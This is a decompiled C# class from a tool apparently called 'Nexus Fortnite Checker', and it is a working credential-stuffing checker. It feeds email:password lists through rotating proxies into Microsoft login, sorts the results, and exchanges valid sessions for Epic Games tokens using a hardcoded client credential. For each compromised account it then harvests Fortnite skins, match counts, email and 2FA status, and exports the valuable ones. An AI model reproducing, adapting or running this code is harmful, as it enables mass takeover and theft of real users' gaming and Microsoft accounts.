// Decompiled with JetBrains decompiler
// Type: NexusFN.API
// Assembly: NexusFN, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 95EF2A8C-0A82-4169-A602-5A6F579F3441
// Assembly location: C:\Users\Renaud\Downloads\Nexus Fortnite Checker\checker.exe

using Leaf.xNet;
using NexusFN.Utilities;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Threading;

#nullable disable
namespace NexusFN
{
  internal class API
  {
    private static string atkx;
    private static string atk;

    [Obfuscation(Feature = "virtualizer", Exclude = false)]
    public static void Check(string wombo)
    {
      if (!Variables.checkerruning)
      {
        try
        {
          foreach (Thread thread in Variables.threads)
            thread.Suspend();
          foreach (Thread thread in Variables.threads)
            thread.Abort();
        }
        catch
        {
        }
        Thread.Sleep(-1);
      }
      using (HttpRequest httpRequest = new HttpRequest())
      {
        string[] strArray = wombo.Split(':', ';', '|');
        string str1 = strArray[0];
        string str2 = strArray[1];
        string str3 = str1 + ":" + str2;
        try
        {
          if (Variables.useproxies)
          {
            string proxy = Variables.proxies[new Random().Next(Variables.proxies.Count)];
            httpRequest.ConnectTimeout = 5000;
            httpRequest.ReadWriteTimeout = 5000;
            httpRequest.KeepAliveTimeout = 5000;
            httpRequest.Proxy = ProxyClient.Parse(Variables.proxtype, proxy);
          }
          httpRequest.AllowAutoRedirect = true;
          httpRequest.IgnoreProtocolErrors = true;
          httpRequest.AllowEmptyHeaderValues = true;
          httpRequest.KeepAlive = true;
          httpRequest.EnableEncodingContent = true;
          httpRequest.UseCookies = true;
          httpRequest.IgnoreInvalidCookie = true;
          httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0");
          httpRequest.AddHeader("Pragma", "no-cache");
          httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
          httpRequest.AddHeader("Accept-Language", "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3");
          httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
          httpRequest.AddHeader("Referer", "https://login.live.com/ppsecure/post.srf?id=292543&contextid=4EDB47CE8CF1F450&opid=7410382025CCDD15&bk=1702684428&uaid=4862a16299bb4a968c21150f145a855b&pid=0");
          httpRequest.AddHeader("Origin", "https://login.live.com");
          httpRequest.AddHeader("DNT", "1");
          httpRequest.AddHeader("Sec-GPC", "1");
          httpRequest.AddHeader("Connection", "keep-alive");
          httpRequest.AddHeader("Upgrade-Insecure-httpRequestuests", "1");
          httpRequest.AddHeader("Sec-Fetch-Dest", "document");
          httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
          httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
          httpRequest.AddHeader("Sec-Fetch-User", "?1");
          string source1 = httpRequest.Post("https://login.live.com/ppsecure/post.srf?", "i13=1&login=" + str1 + "&loginfmt=" + str1 + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + str2 + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpghttpRequestuestid=&PPFT=<ppf>&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=12301", "application/x-www-form-urlencoded").ToString();
          string str4 = Variables.Parse(source1, "urlPost:'", "',");
          string str5 = WebUtility.UrlEncode(Variables.Parse(source1, "name=\"PPFT\" id=\"i0327\" value=\"", "\""));
          httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0");
          httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
          httpRequest.AddHeader("Accept-Language", "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3");
          httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
          httpRequest.AddHeader("Referer", "https://login.live.com/ppsecure/post.srf?id=292543&contextid=4EDB47CE8CF1F450&opid=7410382025CCDD15&bk=1702684428&uaid=4862a16299bb4a968c21150f145a855b&pid=0");
          httpRequest.AddHeader("Origin", "https://login.live.com");
          httpRequest.AddHeader("DNT", "1");
          httpRequest.AddHeader("Sec-GPC", "1");
          httpRequest.AddHeader("Connection", "keep-alive");
          httpRequest.AddHeader("Upgrade-Insecure-httpRequestuests", "1");
          httpRequest.AddHeader("Sec-Fetch-Dest", "document");
          httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
          httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
          httpRequest.AddHeader("Sec-Fetch-User", "?1");
          HttpResponse httpResponse1 = httpRequest.Post(str4, "i13=1&login=" + str1 + "&loginfmt=" + str1 + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + str2 + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpghttpRequestuestid=&PPFT=" + str5 + "&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=12301", "application/x-www-form-urlencoded");
          string str6 = httpResponse1.ToString();
          foreach (object cookie in httpRequest.Cookies.GetCookies(str4))
            Variables.cookiess += cookie?.ToString();
          if (str6.Contains("Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrects.") && !str6.Contains("Connectez-vous avec un compte Microsoft ou créez-en un.") && !str6.Contains("Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrect"))
            ExportManager.Retries(str3);
          else if (str6.Contains("Votre compte ou mot de passe est incorrect. Si vous avez oublié votre mot de passe,") || str6.Contains("Ce compte Microsoft n’existe pas.") || str6.Contains("Votre compte ou mot de passe est incorrect.") || str6.Contains("Ce compte Microsoft n’existe pas. Entrez un autre compte ou <a href=\"https://signup.live") || str6.Contains("Votre compte ou mot de passe est incorrect. Si vous avez") || str6.Contains("n’existe pas. Entrez un autre compte ou <a href="))
            ExportManager.ExportBads(str3);
          else if (str6.Contains("account.live.com/recover?mkt") || str6.Contains("account.live.com/identity/confirm?mkt") || str6.Contains("Email/Confirm?mkt") || str6.Contains("/Abuse?mkt=") || str6.Contains("/cancel?mkt=") || str6.Contains("B:2,CQ:false,bv:'"))
            ExportManager.ExportFlagged(str3);
          else if (Variables.cookiess.Contains("__Host-MSAAUTH") && httpResponse1.StatusCode == Leaf.xNet.HttpStatusCode.OK && !str6.Contains("sDevices:'{\"Devices\""))
          {
            if (str6.Contains("Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrects."))
              ExportManager.ExportFlagged(str3);
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
            httpRequest.AddHeader("Pragma", "no-cache");
            httpRequest.AddHeader("Accept", "*/*");
            HttpResponse httpResponse2 = httpRequest.Get("https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup");
            if (httpResponse2.ToString().Contains("account.live.com/Consent/Update") || httpResponse2.ToString().Contains("Consent"))
            {
              ExportManager.ExportBanned(str3);
            }
            else
            {
              try
              {
                API.atkx = Variables.Parse(httpResponse2.Address.ToString(), "code=", "&");
              }
              catch
              {
                ExportManager.ExportBanned(str3);
              }
              httpRequest.AddHeader("Authorization", "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=");
              HttpResponse httpResponse3 = httpRequest.Post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", "grant_type=external_auth&external_auth_type=xbl&external_auth_token=" + API.atkx, "application/x-www-form-urlencoded");
              string source2 = httpResponse3.ToString();
              if (source2.Contains("Sorry a processing exception occurred while we were waiting for you to send us request data") || httpResponse3.StatusCode == Leaf.xNet.HttpStatusCode.InternalServerError)
                ExportManager.Retries(str3);
              if (source2 == "" || source2.Contains("ext_auth.invalid_external_auth_toke") || source2.Contains("token you provided for the the auth system xbl could not be validated") || source2.Contains("token you provided does not map to an account") || source2.Contains("ve.com/Consent/Update?") || source2.Contains("invalid_grant") || source2.Contains("Corrective action is required to continue."))
              {
                ExportManager.ExportBanned(str3);
              }
              else
              {
                try
                {
                  API.atk = Variables.Parse(source2, "access_token\":\"", "\"");
                }
                catch
                {
                  if (source2.Contains("Sorry a processing exception occurred while we were waiting for you"))
                    ExportManager.Retries(str3);
                  else
                    ExportManager.ExportBanned(str3);
                }
                string username = Variables.Parse(source2, "displayName\":\"", "\"");
                string str7 = Variables.Parse(source2, "account_id\":\"", "\"");
                httpRequest.AddHeader("Authorization", "Bearer " + API.atk);
                string source3 = httpRequest.Get("https://account-public-service-prod.ol.epicgames.com/account/api/public/account/" + str7).ToString();
                string epicmail = "";
                try
                {
                  epicmail = Variables.Parse(source3, "email\":\"", "\"");
                }
                catch
                {
                  ExportManager.ExportBanned(str3);
                }
                if (source3.Contains("tfaEnabled\":false") && epicmail != "")
                {
                  httpRequest.AddHeader("Authorization", "Bearer " + API.atk);
                  string str8 = httpRequest.Post("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + str7 + "/client/QueryProfile?profileId=athena&rvn=-1", "{}", "application/json").ToString();
                  Variables.Parse(str8, "\"accountLevel\" : ", ",");
                  Variables.Parse(str8, "\"lifetime_wins\" : ", ",");
                  string str9 = string.Join(",", Variables.LR(str8, "templateId\" : \"AthenaCharacter:", "\"", true));
                  int skincount = Variables.CountOccurrences(str9, ",");
                  httpRequest.AddHeader("Authorization", "Bearer " + API.atk);
                  string str10 = httpRequest.Get("https://statsproxy-public-service-live.ol.epicgames.com/statsproxy/api/statsv2/account/" + str7).ToString();
                  if (str10.Contains("Login is banned or does not posses the action ") || str10.Contains("errors.com.epicgames.common.missing_actio") || str10.Contains("ccount.no_account_found_for_externa") || str10.Contains("\"error\":\"invalid_grant\""))
                  {
                    ExportManager.ExportBanned(str3);
                  }
                  else
                  {
                    List<string> list = ((IEnumerable<string>) str10.Split(',')).ToList<string>();
                    int matchcount = 0;
                    foreach (string source4 in list)
                    {
                      try
                      {
                        if (source4.Contains("matchesplayed"))
                        {
                          int num = int.Parse(Variables.Parse(source4, "\":", ","));
                          matchcount += num;
                        }
                      }
                      catch
                      {
                      }
                    }
                    httpRequest.AddHeader("Authorization", "Bearer " + API.atk);
                    HttpResponse httpResponse4 = httpRequest.Get("https://entitlement-public-service-prod08.ol.epicgames.com/entitlement/api/account/" + str7 + "/entitlements");
                    bool stw = false;
                    if (httpResponse4.ToString().Contains("entitlementName\":\"Fortnite_Founder\"") && httpResponse4.StatusCode == Leaf.xNet.HttpStatusCode.OK)
                      stw = true;
                    if (str9 != "")
                      ++matchcount;
                    if (matchcount == 0)
                      ++Variables.zeromatches;
                    if (matchcount > 0 && matchcount < 500)
                      ++Variables.onemplus;
                    if (matchcount >= 500 && matchcount < 1000)
                      ++Variables.fivehundredmplus;
                    if (matchcount >= 1000 && matchcount < 2500)
                      ++Variables.onekmplus;
                    if (matchcount >= 2500 && matchcount < 5000)
                      ++Variables.twoandhalfandmplus;
                    if (matchcount >= 5000 && matchcount < 10000)
                      ++Variables.fivekmplus;
                    if (matchcount >= 10000)
                      ++Variables.tenkmplus;
                    if (skincount == 0)
                      ++Variables.zeroskin;
                    if (skincount > 0 && skincount < 10)
                      ++Variables.oneplus;
                    if (skincount >= 10 && skincount < 25)
                      ++Variables.tenplus;
                    if (skincount >= 25 && skincount < 50)
                      ++Variables.twentyfiveplus;
                    if (skincount >= 50 && skincount < 100)
                      ++Variables.fiftyplus;
                    if (skincount >= 100 && skincount < 150)
                      ++Variables.hundredplus;
                    if (skincount >= 150 && skincount < 200)
                      ++Variables.hundredfiftyplus;
                    if (skincount >= 200 && skincount < 250)
                      ++Variables.twohundredplus;
                    if (skincount >= 250)
                      ++Variables.twohundredfiftyplus;
                    bool maybefa = epicmail == str1;
                    ExportManager.ExportSkins(str3, username, skincount, str9, maybefa, epicmail, stw);
                    ExportManager.ExportStats(str3, username, matchcount, maybefa, epicmail, stw);
                  }
                }
                else if (source3.Contains("tfaEnabled\":true"))
                  ExportManager.Epic2Fa(str3);
                else
                  ExportManager.ExportBanned(str3);
              }
            }
          }
          else if (str6.Contains("Connectez-vous avec un compte Microsoft ou créez-en un.") && str6.Contains("Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrect"))
            ExportManager.ExportFlagged(str3);
          else
            ExportManager.Retries(str3);
        }
        catch (Exception ex)
        {
          ExportManager.Retries(str3);
        }
      }
    }
  }
}
